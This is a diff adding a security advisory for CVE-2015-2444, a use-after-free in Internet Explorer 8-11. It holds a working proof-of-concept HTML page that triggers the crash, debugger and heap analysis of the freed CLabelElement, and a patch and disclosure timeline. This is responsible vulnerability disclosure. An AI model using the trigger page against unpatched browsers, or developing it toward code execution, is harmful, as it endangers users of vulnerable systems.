@@ -1,0 +1,305 @@
+<!--
+Blue Frost Security GmbH
+https://www.bluefrostsecurity.de/               research(at)bluefrostsecurity.de
+BFS-SA-2015-001                                                   12-August-2015
+________________________________________________________________________________
+
+Vendor:                 Microsoft, http://www.microsoft.com
+Affected Products:      Internet Explorer
+Affected Version:       IE 8-11
+Vulnerability:          CTreeNode::GetCascadedLang Use-After-Free Vulnerability
+CVE ID:                 CVE-2015-2444
+________________________________________________________________________________
+
+I.   Impact
+
+If an attacker succeeds in bypassing the Memory Protector and Isolated Heap
+protection mechanisms this vulnerability allows the execution of arbitrary
+code on vulnerable installations of Microsoft Internet Explorer. User
+interaction is required to exploit this vulnerability in that the target must
+visit a malicious page or open a malicious file.
+
+________________________________________________________________________________
+
+II.  Vulnerability Details
+
+Microsoft Internet Explorer 11 is prone to a use-after-free vulnerability in
+the MSHTML!CTreeNode::GetCascadedLang function. The following analysis was
+performed on Internet Explorer 11 on Windows 8.1 (x64).
+
+The following HTML page demonstrates the problem:
+-->
+
+<!DOCTYPE HTML>
+<html>
+<meta http-equiv="X-UA-Compatible" content="IE=10" />
+<script>
+	function Trigger() {
+		for(i=0; i < document.getElementsByTagName("meter").length; i++) {
+			document.getElementsByTagName("meter")[i].innerText = "a";
+		}
+	}
+	function reload() {
+		location.reload();
+	}
+	setTimeout("reload()", 1000);
+</script>
+<button><label><style>label{}</style><form>
+<meter>label<optgroup><meter>fieldset<script>Trigger();</script></meter>
+<select></select><button></button><form><form>
+<input><script>Trigger();</script>
+<form><style>form{-ms-behavior: url("c");}</style></form>
+</html>
+
+<!--
+With page heap enabled, visiting that page results in the following crash:
+
+(7c0.408): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\SYSTEM32\MSHTML.dll - 
+eax=00000000 ebx=12698fa0 ecx=0000ffff edx=00000100 esi=00000000 edi=12696fb8
+eip=6fea5a44 esp=0a75ba18 ebp=0a75ba38 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+MSHTML!CreateCoreWebView+0x1e0234:
+6fea5a44 81b828030000506ffb6f cmp dword ptr [eax+328h],offset MSHTML!CreateCoreWebView+0x2f1740 (6ffb6f50) ds:002b:00000328=????????
+
+0:005> ub
+MSHTML!CTreeNode::GetCascadedLang+0x5f:
+6fea5a2b 8945f8          mov     dword ptr [ebp-8],eax
+6fea5a2e 8945f0          mov     dword ptr [ebp-10h],eax
+6fea5a31 8b4710          mov     eax,dword ptr [edi+10h]
+6fea5a34 85c0            test    eax,eax
+6fea5a36 740a            je      MSHTML!CTreeNode::GetCascadedLang+0x76 (6fea5a42)
+6fea5a38 f6400c04        test    byte ptr [eax+0Ch],4
+6fea5a3c 0f859a020000    jne     MSHTML!CTreeNode::GetCascadedLang+0x30f (6fea5cdc)
+6fea5a42 8b07            mov     eax,dword ptr [edi]
+
+0:005> !heap -p -a edi+10
+    address 12696fc8 found in
+    _DPH_HEAP_ROOT @ a961000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 a9646e8:         12696fb8               48 -         12696000             2000
+    71e694ec verifier!AVrfDebugPageHeapAllocate+0x0000023c
+    779057b7 ntdll!RtlDebugAllocateHeap+0x0000003c
+    778a77ce ntdll!RtlpAllocateHeap+0x0004665a
+    77861134 ntdll!RtlAllocateHeap+0x0000014d
+    6fa31dd5 MSHTML!CLabelElement::CreateElement+0x00000015
+    6f8a5b4d MSHTML!CreateElement+0x00000084
+    6fa14768 MSHTML!CInBodyInsertionMode::DefaultStartElementHandler+0x00000078
+    6f91d6eb MSHTML!CInsertionMode::HandleStartElementToken+0x0000003d
+    6f91d3a3 MSHTML!CHtml5TreeConstructor::HandleElementTokenInInsertionMode+0x00000026
+    6f91d338 MSHTML!CHtml5TreeConstructor::PushElementToken+0x000000a5
+    6f91d1cc MSHTML!CHtml5Tokenizer::TagName_StateHandler+0x0000028c
+    6f91ab35 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000012c
+    6f91ae09 MSHTML!CHtml5Parse::ParseToken+0x00000131
+    6f91a377 MSHTML!CHtmPost::ProcessTokens+0x000006af
+    6f914952 MSHTML!CHtmPost::Exec+0x000001e4
+    6f991118 MSHTML!CHtmPost::Run+0x0000003d
+    6f99107e MSHTML!PostManExecute+0x00000061
+    6f9994a2 MSHTML!PostManResume+0x0000007b
+    6f9b04f7 MSHTML!CDwnChan::OnMethodCall+0x0000003e
+    6f7fd865 MSHTML!GlobalWndOnMethodCall+0x0000016d
+    6f7fd18a MSHTML!GlobalWndProc+0x000002e5
+    75a68e71 user32!_InternalCallWinProc+0x0000002b
+    75a690d1 user32!UserCallWinProcCheckWow+0x0000018e
+    75a6a66f user32!DispatchMessageWorker+0x00000208
+    75a6a6e0 user32!DispatchMessageW+0x00000010
+    710600d8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464
+    7108d0d8 IEFRAME!LCIETab_ThreadProc+0x0000037b
+    71c7d81c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c
+    70ef3991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094
+    755f7c04 KERNEL32!BaseThreadInitThunk+0x00000024
+    7787ad1f ntdll!__RtlUserThreadStart+0x0000002f
+    7787acea ntdll!_RtlUserThreadStart+0x0000001b
+
+0:005> db edi+10
+12696fc8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+12696fd8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+12696fe8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+12696ff8  00 00 00 00 00 00 00 00-?? ?? ?? ?? ?? ?? ?? ??  ........????????
+12697008  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+12697018  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+12697028  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+12697038  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+
+This looks like a use-after-free on memory which was previously freed by the
+ProtectedFree implementation (and zeroed-out) and thus the memory is not yet
+marked as free by the heap manager. To verify this assumption, we first disable
+the Memory Protect feature to see if it's really accessing freed memory:
+
+C:\>reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_MEMPROTECT_MODE"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\Main\Feature
+Control\FEATURE_MEMPROTECT_MODE
+    iexplore.exe    REG_DWORD    0x0
+
+If we trigger the crash again, we notice that this time freed memory is
+accessed and the memory was indeed previously allocated by the ProtectedFree
+function.
+
+(12c.4a4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=0e958fa0 ecx=0000ffff edx=00000100 esi=00000000 edi=0e982fb8
+eip=70595a31 esp=0b3cbda0 ebp=0b3cbdc0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+MSHTML!CTreeNode::GetCascadedLang+0x65:
+70595a31 8b4710          mov     eax,dword ptr [edi+10h] ds:002b:0e982fc8=????????
+
+0:006> !heap -p -a edi+10
+    address 0e982fc8 found in
+    _DPH_HEAP_ROOT @ aa31000
+    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    aa34f70:          e982000             2000
+    72909712 verifier!AVrfDebugPageHeapFree+0x000000c2
+    77906061 ntdll!RtlDebugFreeHeap+0x0000003c
+    778a69ea ntdll!RtlpFreeHeap+0x00044b2f
+    77861eaa ntdll!RtlFreeHeap+0x000001b6
+    6feacbbd MSHTML!MemoryProtection::CMemoryProtector::ProtectedFree+0x00000122
+    701a8a95 MSHTML!CLabelElement::`vector deleting destructor'+0x00000025
+    6fef7001 MSHTML!CBase::SubRelease+0x00000045
+    6ff14ee2 MSHTML!CElement::PrivateExitTree+0x00000060
+    6ff15c8a MSHTML!CMarkup::DestroySplayTree+0x000003ab
+    6ff16b26 MSHTML!CMarkup::UnloadContents+0x00000d33
+    70198f3c MSHTML!CMarkup::TearDownMarkupHelper+0x000000a7
+    70198e63 MSHTML!CMarkup::TearDownMarkup+0x00000058
+    7018af24 MSHTML!COmWindowProxy::SwitchMarkup+0x000004f3
+    70876d6a MSHTML!COmWindowProxy::ExecRefresh+0x00000a1d
+    70876ee3 MSHTML!COmWindowProxy::ExecRefreshCallback+0x00000023
+    6feed865 MSHTML!GlobalWndOnMethodCall+0x0000016d
+    6feed18a MSHTML!GlobalWndProc+0x000002e5
+    75a68e71 user32!_InternalCallWinProc+0x0000002b
+    75a690d1 user32!UserCallWinProcCheckWow+0x0000018e
+    75a6a66f user32!DispatchMessageWorker+0x00000208
+    75a6a6e0 user32!DispatchMessageW+0x00000010
+    71a700d8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464
+    71a9d0d8 IEFRAME!LCIETab_ThreadProc+0x0000037b
+    7271d81c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c
+    716f3991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094
+    755f7c04 KERNEL32!BaseThreadInitThunk+0x00000024
+    7787ad1f ntdll!__RtlUserThreadStart+0x0000002f
+    7787acea ntdll!_RtlUserThreadStart+0x0000001b
+
+0:006> kb
+ChildEBP RetAddr  Args to Child              
+0b3cbdc0 7059559d 1330afc8 0b3cc1ec 00000001 MSHTML!CTreeNode::GetCascadedLang+0x65
+0b3cbe78 700173bf 0ab19fa0 0e615fa0 00000003 MSHTML!CStyleSheetArray::BuildListOfProbableRules+0x2d5
+0b3cbf3c 6fff6d3c 0b3cc1ec 00000001 00000003 MSHTML!CStyleSheetArray::BuildListOfMatchedRules+0x57
+0b3cc190 70284613 0b3cc1ec 00000003 00000400 MSHTML!CMarkup::ApplyStyleSheets+0xca
+0b3cc1c4 701a742e 0b3cc1ec 00000000 0aa41bb8 MSHTML!CElement::ApplyBehaviorCss+0x9e
+0b3cc46c 700adfe3 00000004 07450000 0aa41bb8 MSHTML!CElement::ProcessPeerTask+0xc1f
+0b3cc488 700adf3c 00000000 1375dfe8 0aa41bb8 MSHTML!CMarkup::ProcessPeerTaskContext+0x8e
+0b3cc4a0 700d3070 0aa41bb8 00000000 00000000 MSHTML!CMarkup::ProcessPeerTasks+0x3f
+0b3cc550 6ff17539 00000001 00000000 0b3cc57c MSHTML!CMarkup::UnloadContents+0x1017
+0b3cc574 6fef705c 0f4febb8 00000001 6feeccb0 MSHTML!CMarkup::Passivate+0x89
+0b3cc58c 6feecccc 0f4febb8 0f4febb8 00000001 MSHTML!CBase::PrivateRelease+0xbc
+0b3cc5a8 6ff040f6 0f4febb8 0b3cc5d0 6feecf70 MSHTML!CMarkup::Release+0x18
+0b3cc5c4 703edeb0 0f318f18 0e97cf90 00000000 MSHTML!CTxtSite::Release+0xc2
+0b3cc5d8 703ede77 00000000 0e97cf90 00000000 MSHTML!CImplPtrAry::ReleaseAndDelete+0x2e
+0b3cc5ec 70481a67 00000000 0b3cc624 0e97cf90 MSHTML!CFormElement::DetachExtraFormInputSiteByIndex+0x22
+0b3cc5fc 701b66e3 0e97cf90 0b3cc618 0b3cc680 MSHTML!CFormElement::DetachAllExtraFormInputSites+0x13
+0b3cc60c 6ff15be3 0b3cc624 0b3cc690 7019abb0 MSHTML!CFormElement::Notify+0x76
+0b3cc680 6ff16b26 00000001 00000001 0f2ace30 MSHTML!CMarkup::DestroySplayTree+0x2dd
+0b3cc730 70198f3c 00000000 00000001 0c9d4bd0 MSHTML!CMarkup::UnloadContents+0xd33
+0b3cc748 70198e63 00000001 00000001 0f33cbb8 MSHTML!CMarkup::TearDownMarkupHelper+0xa7
+0b3cc770 7018af24 00000001 00000001 0b3cc838 MSHTML!CMarkup::TearDownMarkup+0x58
+0b3cc818 70876d6a 0f33cbb8 00000000 00000000 MSHTML!COmWindowProxy::SwitchMarkup+0x4f3
+0b3cc8fc 70876ee3 00005004 ffffffff 00000000 MSHTML!COmWindowProxy::ExecRefresh+0xa1d
+0b3cc910 6feed865 0aeb9f68 00005004 0ba04cc8 MSHTML!COmWindowProxy::ExecRefreshCallback+0x23
+0b3cc95c 6feed18a 3e26b724 6feec290 00008002 MSHTML!GlobalWndOnMethodCall+0x16d
+0b3cc9ac 75a68e71 000103d0 00008002 00000000 MSHTML!GlobalWndProc+0x2e5
+0b3cc9d8 75a690d1 6feec290 000103d0 00008002 user32!_InternalCallWinProc+0x2b
+0b3cca6c 75a6a66f 6feec290 00000000 00008002 user32!UserCallWinProcCheckWow+0x18e
+0b3ccad8 75a6a6e0 30748176 0b3cfcb0 71a700d8 user32!DispatchMessageWorker+0x208
+0b3ccae4 71a700d8 0b3ccb24 11ce0e48 1161cfe0 user32!DispatchMessageW+0x10
+0b3cfcb0 71a9d0d8 0b3cfd7c 71a9cd50 11cdeff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+0b3cfd70 7271d81c 11ce0e48 0b3cfd94 71b05f70 IEFRAME!LCIETab_ThreadProc+0x37b
+0b3cfd88 716f3991 11cdeff0 716f3900 716f3900 iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1c
+0b3cfdc0 755f7c04 0e502fe8 755f7be0 3b839130 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x94
+0b3cfdd4 7787ad1f 0e502fe8 3972bde9 00000000 KERNEL32!BaseThreadInitThunk+0x24
+0b3cfe1c 7787acea ffffffff 7786022b 00000000 ntdll!__RtlUserThreadStart+0x2f
+0b3cfe2c 00000000 716f3900 0e502fe8 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+If we check the accessed memory location just before the JavaScript method
+location.reload() is called, we can see where the memory for the CLabelElement
+object was allocated.
+
+0:020> !heap -p -a 0e982fc8
+    address 0e982fc8 found in
+    _DPH_HEAP_ROOT @ aa31000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 aa34f70:          e982fb8               48 -          e982000             2000
+          MSHTML!CLabelElement::`vftable'
+    729094ec verifier!AVrfDebugPageHeapAllocate+0x0000023c
+    779057b7 ntdll!RtlDebugAllocateHeap+0x0000003c
+    778a77ce ntdll!RtlpAllocateHeap+0x0004665a
+    77861134 ntdll!RtlAllocateHeap+0x0000014d
+    70121dd5 MSHTML!CLabelElement::CreateElement+0x00000015
+    6ff95b4d MSHTML!CreateElement+0x00000084
+    70104768 MSHTML!CInBodyInsertionMode::DefaultStartElementHandler+0x00000078
+    7000d6eb MSHTML!CInsertionMode::HandleStartElementToken+0x0000003d
+    7000d3a3 MSHTML!CHtml5TreeConstructor::HandleElementTokenInInsertionMode+0x00000026
+    7000d338 MSHTML!CHtml5TreeConstructor::PushElementToken+0x000000a5
+    7000d1cc MSHTML!CHtml5Tokenizer::TagName_StateHandler+0x0000028c
+    7000ab35 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000012c
+    7000ae09 MSHTML!CHtml5Parse::ParseToken+0x00000131
+    7000a377 MSHTML!CHtmPost::ProcessTokens+0x000006af
+    70004952 MSHTML!CHtmPost::Exec+0x000001e4
+    70081118 MSHTML!CHtmPost::Run+0x0000003d
+    7008107e MSHTML!PostManExecute+0x00000061
+    700894a2 MSHTML!PostManResume+0x0000007b
+    700a04f7 MSHTML!CDwnChan::OnMethodCall+0x0000003e
+    6feed865 MSHTML!GlobalWndOnMethodCall+0x0000016d
+    6feed18a MSHTML!GlobalWndProc+0x000002e5
+    75a68e71 user32!_InternalCallWinProc+0x0000002b
+    75a690d1 user32!UserCallWinProcCheckWow+0x0000018e
+    75a6a66f user32!DispatchMessageWorker+0x00000208
+    75a6a6e0 user32!DispatchMessageW+0x00000010
+    71a700d8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464
+    71a9d0d8 IEFRAME!LCIETab_ThreadProc+0x0000037b
+    7271d81c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c
+    716f3991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094
+    755f7c04 KERNEL32!BaseThreadInitThunk+0x00000024
+    7787ad1f ntdll!__RtlUserThreadStart+0x0000002f
+    7787acea ntdll!_RtlUserThreadStart+0x0000001b
+________________________________________________________________________________
+
+III. Mitigation
+
+The issue was fixed in MS15-079 which should be installed to resolve the issue.
+
+________________________________________________________________________________
+
+IV.  Disclosure Timeline
+
+- 2015-05-11 Vulnerability reported to secure@microsoft.com
+- 2015-05-11 Acknowledgement of received report
+- 2015-05-14 Microsoft confirms that they successfully reproduced the issue
+- 2015-06-03 Requested a status update
+- 2015-06-03 Microsoft confirms that they are currently working on a fix and
+             they want to know if hitting the August patch day would be
+             acceptable, because that would be 2 days after the 90 day
+             disclosure timeline
+- 2015-07-14 Requested a status upate
+- 2015-07-15 Microsoft confirms to be on track for the August patch day
+- 2015-08-10 Requested another status update
+- 2015-08-11 Microsoft resolves issue in MS15-079
+
+________________________________________________________________________________
+
+Credit:
+Bug found by Moritz Jodeit of Blue Frost Security GmbH.
+________________________________________________________________________________
+
+Unaltered electronic reproduction of this advisory is permitted. For all other
+reproduction or publication, in printing or otherwise, contact
+research@bluefrostsecurity.de for permission. Use of the advisory constitutes
+acceptance for use in an "as is" condition. All warranties are excluded. In no
+event shall Blue Frost Security be liable for any damages whatsoever including
+direct, indirect, incidental, consequential, loss of business profits or
+special damages, even if Blue Frost Security has been advised of the
+possibility of such damages.
+
+Copyright 2015 Blue Frost Security GmbH. All rights reserved. Terms of use apply.
+-->
